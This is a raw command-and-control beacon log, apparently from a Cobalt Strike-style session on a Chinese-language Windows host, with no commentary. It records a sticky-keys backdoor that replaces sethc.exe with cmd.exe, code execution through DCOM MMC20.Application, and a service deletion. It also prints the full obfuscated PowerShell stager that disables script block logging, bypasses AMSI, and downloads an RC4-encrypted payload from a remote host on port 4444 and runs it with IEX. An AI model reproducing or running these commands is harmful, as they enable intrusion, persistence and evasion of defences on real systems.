03/11 12:06:03 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\sethc.exe" /A
03/11 12:06:03 [task] Tasked beacon to run: icacls "C:\Windows\System32\sethc.exe" /grant Administrators:F
03/11 12:06:03 [task] Tasked beacon to run: copy cmd.exe sethc.exe
03/11 12:06:03 [task] Tasked beacon to run: C:\Windows\System32\sethc.exe /k ipconfig
03/11 12:06:33 [checkin] host called home, sent: 397 bytes
03/11 12:06:36 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\sethc.exe" 现在由管理员组所有。


03/11 12:06:36 [output]
received output:
已处理的文件: C:\Windows\System32\sethc.exe
已成功处理 1 个文件; 处理 0 个文件时失败


03/11 12:06:36 [output]
received output:
系统找不到指定的文件。


03/11 12:06:36 [output]
received output:

Windows IP 配置


以太网适配器 本地连接:

   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::dc70:1ea3:67b5:311%11
   IPv4 地址 . . . . . . . . . . . . : 172.17.2.54
   子网掩码  . . . . . . . . . . . . : 255.255.254.0
   默认网关. . . . . . . . . . . . . : 172.17.2.1

隧道适配器 isatap.{A8E7B51B-9069-45DB-BA99-054EA369046E}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 

C:\Users\a\Desktop>

03/11 14:14:05 [task] Tasked beacon to run: sc start DcomLaunch
03/11 14:14:05 [task] Tasked beacon to run: $Com=[Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","localhost"));$Com.Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
03/11 14:14:38 [checkin] host called home, sent: 617 bytes
03/11 14:14:39 [output]
received output:
[SC] StartService 失败 1056:

服务的实例已在运行中。



03/11 14:16:42 [task] execute bypass UAC With Powershell add -Enc Command
03/11 14:17:39 [checkin] host called home, sent: 4033 bytes
03/11 14:18:49 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">使用“1”个参数调用“DownloadData”时发生异常:“无法连接到远程服务器”_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 1401_x000D__x000A_</S><S S="Error">+ IF($PSVERSIOnTable.PSVersIon.MAjor -GE 3){$GPS=[ref].AssEmBlY.GEtTYpE('System_x000D__x000A_</S><S S="Error">.Management.Automation.Utils')."GetFiE`Ld"('cachedGroupPolicySettings','N'+'onP_x000D__x000A_</S><S S="Error">ublic,Static').GEtVaLUE($nUll);If($GPS['ScriptB'+'lockLogging']){$GPS['ScriptB'_x000D__x000A_</S><S S="Error">+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPS['ScriptB'+'lockLogging'][_x000D__x000A_</S><S S="Error">'EnableScriptBlockInvocationLogging']=0}ELse{[ScrIPTBLoCk]."GetFIe`ld"('signatu_x000D__x000A_</S><S S="Error">res','N'+'onPublic,Static').SetVALue($nUlL,(New-OBJect CoLlECTiONs.GEnErIC.HAsH_x000D__x000A_</S><S S="Error">Set[STring]))}[ReF].ASseMbly.GETTYPe('System.Management.Automation.AmsiUtils')|_x000D__x000A_</S><S S="Error">?{$_}|%{$_.GEtFiElD('amsiInitFailed','NonPublic,Static').SETVALUe($nULL,$trUE)}_x000D__x000A_</S><S S="Error">;};[SYSteM.NeT.SERvICEPoiNTManagEr]::ExPECT100ContInue=0;$wC=New-ObJecT SyStem._x000D__x000A_</S><S S="Error">NEt.WEbCLIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) lik_x000D__x000A_</S><S S="Error">e Gecko';$wc.HEadErS.ADd('User-Agent',$u);$WC.PROXy=[SystEm.NeT.WEbREqUEsT]::DE_x000D__x000A_</S><S S="Error">FaulTWEbProxY;$WC.PROXy.CREDeNTiALs = [SYstEm.NEt.CrEDENtiaLCachE]::DeFAUlTNEtw_x000D__x000A_</S><S S="Error">oRkCREDENTialS;$Script:Proxy = $wc.Proxy;$K=[SystEm.TeXT.EnCODing]::ASCII.GetBy_x000D__x000A_</S><S S="Error">TEs('[e6z2!pbTr75sE(3PHSyX^c{an&lt;F_h@+');$R={$D,$K=$ArGs;$S=0..255;0..255|%{$J=(_x000D__x000A_</S><S S="Error">$J+$S[$_]+$K[$_%$K.CounT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;_x000D__x000A_</S><S S="Error">$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}}_x000D__x000A_</S><S S="Error">;$ser='http://192.168.233.139:4444';$t='/news.php';$Wc.HEAdeRs.ADD("Cookie","se_x000D__x000A_</S><S S="Error">ssion=xfw+K3eCYz0EgUgNW18BFYPvbLQ=");$datA=$WC.DoWNlOADDATA &lt;&lt;&lt;&lt; ($SeR+$T);$iv=_x000D__x000A_</S><S S="Error">$dATA[0..3];$data=$dAta[4..$daTa.lEngth];-jOIn[Char[]](&amp; $R $data ($IV+$K))|IEX_x000D__x000A_</S><S S="Error">    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : DotNetMethodException_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S><S S="Error">无法对空数组进行索引。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 1421_x000D__x000A_</S><S S="Error">+ IF($PSVERSIOnTable.PSVersIon.MAjor -GE 3){$GPS=[ref].AssEmBlY.GEtTYpE('System_x000D__x000A_</S><S S="Error">.Management.Automation.Utils')."GetFiE`Ld"('cachedGroupPolicySettings','N'+'onP_x000D__x000A_</S><S S="Error">ublic,Static').GEtVaLUE($nUll);If($GPS['ScriptB'+'lockLogging']){$GPS['ScriptB'_x000D__x000A_</S><S S="Error">+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPS['ScriptB'+'lockLogging'][_x000D__x000A_</S><S S="Error">'EnableScriptBlockInvocationLogging']=0}ELse{[ScrIPTBLoCk]."GetFIe`ld"('signatu_x000D__x000A_</S><S S="Error">res','N'+'onPublic,Static').SetVALue($nUlL,(New-OBJect CoLlECTiONs.GEnErIC.HAsH_x000D__x000A_</S><S S="Error">Set[STring]))}[ReF].ASseMbly.GETTYPe('System.Management.Automation.AmsiUtils')|_x000D__x000A_</S><S S="Error">?{$_}|%{$_.GEtFiElD('amsiInitFailed','NonPublic,Static').SETVALUe($nULL,$trUE)}_x000D__x000A_</S><S S="Error">;};[SYSteM.NeT.SERvICEPoiNTManagEr]::ExPECT100ContInue=0;$wC=New-ObJecT SyStem._x000D__x000A_</S><S S="Error">NEt.WEbCLIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) lik_x000D__x000A_</S><S S="Error">e Gecko';$wc.HEadErS.ADd('User-Agent',$u);$WC.PROXy=[SystEm.NeT.WEbREqUEsT]::DE_x000D__x000A_</S><S S="Error">FaulTWEbProxY;$WC.PROXy.CREDeNTiALs = [SYstEm.NEt.CrEDENtiaLCachE]::DeFAUlTNEtw_x000D__x000A_</S><S S="Error">oRkCREDENTialS;$Script:Proxy = $wc.Proxy;$K=[SystEm.TeXT.EnCODing]::ASCII.GetBy_x000D__x000A_</S><S S="Error">TEs('[e6z2!pbTr75sE(3PHSyX^c{an&lt;F_h@+');$R={$D,$K=$ArGs;$S=0..255;0..255|%{$J=(_x000D__x000A_</S><S S="Error">$J+$S[$_]+$K[$_%$K.CounT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;_x000D__x000A_</S><S S="Error">$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}}_x000D__x000A_</S><S S="Error">;$ser='http://192.168.233.139:4444';$t='/news.php';$Wc.HEAdeRs.ADD("Cookie","se_x000D__x000A_</S><S S="Error">ssion=xfw+K3eCYz0EgUgNW18BFYPvbLQ=");$datA=$WC.DoWNlOADDATA($SeR+$T);$iv=$dATA[_x000D__x000A_</S><S S="Error"> &lt;&lt;&lt;&lt; 0..3];$data=$dAta[4..$daTa.lEngth];-jOIn[Char[]](&amp; $R $data ($IV+$K))|IEX_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidOperation: (System.Object[]:Object[]) [], _x000D__x000A_</S><S S="Error">    RuntimeException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : NullArray_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S><S S="Error">无法对空数组进行索引。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 1439_x000D__x000A_</S><S S="Error">+ IF($PSVERSIOnTable.PSVersIon.MAjor -GE 3){$GPS=[ref].AssEmBlY.GEtTYpE('System_x000D__x000A_</S><S S="Error">.Management.Automation.Utils')."GetFiE`Ld"('cachedGroupPolicySettings','N'+'onP_x000D__x000A_</S><S S="Error">ublic,Static').GEtVaLUE($nUll);If($GPS['ScriptB'+'lockLogging']){$GPS['ScriptB'_x000D__x000A_</S><S S="Error">+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPS['ScriptB'+'lockLogging'][_x000D__x000A_</S><S S="Error">'EnableScriptBlockInvocationLogging']=0}ELse{[ScrIPTBLoCk]."GetFIe`ld"('signatu_x000D__x000A_</S><S S="Error">res','N'+'onPublic,Static').SetVALue($nUlL,(New-OBJect CoLlECTiONs.GEnErIC.HAsH_x000D__x000A_</S><S S="Error">Set[STring]))}[ReF].ASseMbly.GETTYPe('System.Management.Automation.AmsiUtils')|_x000D__x000A_</S><S S="Error">?{$_}|%{$_.GEtFiElD('amsiInitFailed','NonPublic,Static').SETVALUe($nULL,$trUE)}_x000D__x000A_</S><S S="Error">;};[SYSteM.NeT.SERvICEPoiNTManagEr]::ExPECT100ContInue=0;$wC=New-ObJecT SyStem._x000D__x000A_</S><S S="Error">NEt.WEbCLIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) lik_x000D__x000A_</S><S S="Error">e Gecko';$wc.HEadErS.ADd('User-Agent',$u);$WC.PROXy=[SystEm.NeT.WEbREqUEsT]::DE_x000D__x000A_</S><S S="Error">FaulTWEbProxY;$WC.PROXy.CREDeNTiALs = [SYstEm.NEt.CrEDENtiaLCachE]::DeFAUlTNEtw_x000D__x000A_</S><S S="Error">oRkCREDENTialS;$Script:Proxy = $wc.Proxy;$K=[SystEm.TeXT.EnCODing]::ASCII.GetBy_x000D__x000A_</S><S S="Error">TEs('[e6z2!pbTr75sE(3PHSyX^c{an&lt;F_h@+');$R={$D,$K=$ArGs;$S=0..255;0..255|%{$J=(_x000D__x000A_</S><S S="Error">$J+$S[$_]+$K[$_%$K.CounT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;_x000D__x000A_</S><S S="Error">$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}}_x000D__x000A_</S><S S="Error">;$ser='http://192.168.233.139:4444';$t='/news.php';$Wc.HEAdeRs.ADD("Cookie","se_x000D__x000A_</S><S S="Error">ssion=xfw+K3eCYz0EgUgNW18BFYPvbLQ=");$datA=$WC.DoWNlOADDATA($SeR+$T);$iv=$dATA[_x000D__x000A_</S><S S="Error">0..3];$data=$dAta[ &lt;&lt;&lt;&lt; 4..$daTa.lEngth];-jOIn[Char[]](&amp; $R $data ($IV+$K))|IEX_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidOperation: (System.Object[]:Object[]) [], _x000D__x000A_</S><S S="Error">    RuntimeException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : NullArray_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S><S S="Error">无法将“Q”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请检查名称的拼写_x000D__x000A_</S><S S="Error">，如果包括路径，请确保路径正确，然后重试。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 2_x000D__x000A_</S><S S="Error">+ Q &lt;&lt;&lt;&lt; _x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (Q:String) [], CommandNotFoundEx _x000D__x000A_</S><S S="Error">   ception_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : CommandNotFoundException_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

03/11 15:28:25 [task] Tasked beacon to run: sc delete netsrv
03/11 15:28:50 [checkin] host called home, sent: 47 bytes
03/11 15:28:50 [output]
received output:
[SC] DeleteService 成功


